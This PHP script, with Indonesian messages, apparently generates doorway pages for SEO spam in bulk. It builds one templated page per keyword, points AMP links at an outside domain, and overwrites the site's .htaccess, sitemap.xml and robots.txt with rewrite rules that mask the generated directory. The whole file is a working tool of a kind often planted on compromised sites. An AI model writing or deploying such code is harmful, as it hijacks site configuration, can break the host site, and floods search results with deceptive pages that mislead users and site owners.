<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

function getFileContent($filePath) {
    if (!file_exists($filePath)) {
        throw new Exception("File tidak ditemukan di: $filePath");
    }
    $content = file_get_contents($filePath);
    if ($content === false) {
        throw new Exception("Gagal membaca konten file: $filePath");
    }
    return $content;
}

function ensureTrailingSlash($url) {
    return rtrim($url, '/') . '/';
}

function formatArticle($article) {
    $article = trim($article);
    return '<p>' . $article . '</p>';
}

$filename = $gas_txt;
$templateFile = $template_php;
$mainDir = "gas";
$successfulUrls = [];
$titlesFile = $title_txt;
$descriptionsFile = $descriptions_txt;
$artikelFile = $artikel_txt;

$titles = [];
$descriptions = [];
$articles = [];

try {
    $titleContent = getFileContent($titlesFile);
    $titles = array_filter(array_map('trim', explode("\n", $titleContent)));
    
    if (empty($titles)) {
        throw new Exception("File title kosong atau tidak valid");
    }
    
    $descriptionContent = getFileContent($descriptionsFile);
    $descriptions = array_filter(array_map('trim', explode("\n", $descriptionContent)));
    
    if (empty($descriptions)) {
        throw new Exception("File description kosong atau tidak valid");
    }

    $articleContent = getFileContent($artikelFile);
    $articles = array_filter(array_map('trim', explode("\n", $articleContent)));
    
    if (empty($articles)) {
        throw new Exception("File artikel kosong atau tidak valid");
    }

    $templateContent = getFileContent($templateFile);

    $keywordsContent = getFileContent($filename);
    $lines = explode("\n", $keywordsContent);
    $lines = array_filter(array_map('trim', $lines));

    if (!is_dir($mainDir)) {
        if (!mkdir($mainDir, 0755, true)) {
            throw new Exception("Gagal membuat direktori '$mainDir'");
        }
    }

    $currentDomain = $_SERVER['HTTP_HOST'];

    $titleIndex = 0;
    $descriptionIndex = 0;
    $articleIndex = 0;

    foreach ($lines as $line) {
        $folderName = str_replace(' ', '-', trim($line));
        $folderPath = "$mainDir/$folderName";
        
        $folderURL = ensureTrailingSlash("https://$currentDomain/$folderName");
        $ampURL = ensureTrailingSlash("https://ampmasal.xyz/$folderName");
        
        $title = isset($titles[$titleIndex]) ? $titles[$titleIndex] : $titles[0];
        $description = isset($descriptions[$descriptionIndex]) ? $descriptions[$descriptionIndex] : $descriptions[0];
        $article = isset($articles[$articleIndex]) ? formatArticle($articles[$articleIndex]) : formatArticle($articles[0]);

        $titleIndex = ($titleIndex + 1) % count($titles);
        $descriptionIndex = ($descriptionIndex + 1) % count($descriptions);
        $articleIndex = ($articleIndex + 1) % count($articles);

        if (!is_dir($folderPath) && !mkdir($folderPath, 0755, true)) {
            continue;
        }

        $customContent = str_replace(
            [
                '{{BRAND_NAME}}',
                '{{URL_PATH}}',
                '{{AMP_URL}}',
                '{{BRANDS_NAME}}',
                '{{TITLE}}',
                '{{DESCRIPTION}}',
                '{{ARTICLE_CONTENT}}'
            ],
            [
                strtoupper($folderName),
                $folderURL,
                $ampURL,
                strtolower($folderName),
                $title,
                $description,
                $article
            ],
            $templateContent
        );

        $indexPath = "$folderPath/index.php";
        if (file_put_contents($indexPath, $customContent) !== false) {
            echo "🔗 <a href='$folderURL' target='_blank'>$folderURL</a><br>";
            $successfulUrls[] = $folderURL;
            chmod($indexPath, 0644);
        }
    }

    $htaccess = "RewriteEngine On\n";
    $htaccess .= "RewriteBase /\n\n";
    $htaccess .= "# Enforce trailing slash\n";
    $htaccess .= "RewriteCond %{REQUEST_URI} /+[^\.]+$\n";
    $htaccess .= "RewriteRule ^(.+[^/])$ %{REQUEST_URI}/ [R=301,L]\n\n";
    $htaccess .= "# Redirect from /gas/ URLs\n";
    $htaccess .= "RewriteCond %{THE_REQUEST} \s/+gas/([^\s]+) [NC]\n";
    $htaccess .= "RewriteRule ^ /%1 [R=301,L,NE]\n\n";
    $htaccess .= "# Internal rewrite\n";
    $htaccess .= "RewriteCond %{REQUEST_FILENAME} !-f\n";
    $htaccess .= "RewriteCond %{REQUEST_FILENAME} !-d\n";
    $htaccess .= "RewriteCond %{REQUEST_URI} !^/gas/\n";
    $htaccess .= "RewriteRule ^([^/]+)/?$ gas/$1/ [L,PT]\n\n";
    $htaccess .= "# Prevent direct gas access\n";
    $htaccess .= "RewriteCond %{REQUEST_URI} ^/gas/\n";
    $htaccess .= "RewriteCond %{ENV:REDIRECT_STATUS} ^$\n";
    $htaccess .= "RewriteRule ^ - [F]\n\n";
    $htaccess .= "# Disable directory indexing\n";
    $htaccess .= "Options -Indexes\n\n";
    $htaccess .= "# Prevent caching\n";
    $htaccess .= "<IfModule mod_headers.c>\n";
    $htaccess .= "    Header set Cache-Control \"no-cache, no-store, must-revalidate\"\n";
    $htaccess .= "    Header set Pragma \"no-cache\"\n";
    $htaccess .= "    Header set Expires 0\n";
    $htaccess .= "</IfModule>";

    if (file_put_contents('.htaccess', $htaccess) === false) {
        throw new Exception("Gagal membuat file .htaccess");
    }
    chmod('.htaccess', 0644);

    $sitemap = '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    $sitemap .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
    
    foreach ($successfulUrls as $url) {
        $sitemap .= "<url>\n";
        $sitemap .= "\t<loc>" . $url . "</loc>\n";
        $sitemap .= "\t<lastmod>" . date('Y-m-d') . "</lastmod>\n";
        $sitemap .= "\t<changefreq>weekly</changefreq>\n";
        $sitemap .= "\t<priority>1.0</priority>\n";
        $sitemap .= "</url>\n";
    }
    
    $sitemap .= "</urlset>";

    if (file_put_contents('sitemap.xml', $sitemap) !== false) {
        echo "<br>✅ Sitemap.xml berhasil dibuat<br>";
        chmod('sitemap.xml', 0644);
    }

    $robotsContent = "User-agent: *\n";
    $robotsContent .= "Sitemap: " . ensureTrailingSlash("https://" . $currentDomain) . "sitemap.xml";

    if (file_put_contents('robots.txt', $robotsContent) !== false) {
        echo "✅ Robots.txt berhasil dibuat<br>";
        chmod('robots.txt', 0644);
    }

    echo "<br>Proses selesai.";

} catch (Exception $e) {
    echo "<h2>Error:</h2>";
    echo $e->getMessage();
    error_log("Create Folders Error: " . $e->getMessage());
}
?>
